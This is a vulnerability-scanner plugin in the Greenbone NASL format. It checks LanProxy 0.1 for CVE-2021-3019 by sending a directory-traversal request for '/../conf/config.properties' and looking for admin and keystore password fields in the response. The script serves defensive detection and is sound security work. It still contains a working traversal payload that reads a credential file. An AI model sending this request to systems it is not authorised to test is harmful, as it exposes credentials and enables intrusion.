# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:lanproxy_project:lanproxy";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.145290");
  script_version("2021-02-01T06:53:28+0000");
  script_tag(name:"last_modification", value:"2021-02-01 11:21:35 +0000 (Mon, 01 Feb 2021)");
  script_tag(name:"creation_date", value:"2021-02-01 06:37:52 +0000 (Mon, 01 Feb 2021)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2021-3019");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("LanProxy 0.1 Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_lanproxy_http_detect.nasl");
  script_require_ports("Services/www", 8090);
  script_mandatory_keys("lanproxy/detected");

  script_tag(name:"summary", value:"LanProxy is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"It is possible to read /../conf/config.properties and obtain credentials
  for a connection to the intranet.");

  script_tag(name:"affected", value:"LanProxy version 0.1.");

  script_tag(name:"solution", value:"No known solution is available as of 01st February, 2021.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://github.com/maybe-why-not/lanproxy/issues/1");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/../conf/config.properties";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ("config.admin.username" >< res || "server.ssl.keyStorePassword" >< res) {
  report = 'It was possible to obtain the property file at ' + http_report_vuln_url(port: port, url: url, url_only: TRUE) +
           '\n\nResult:\n\n' + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
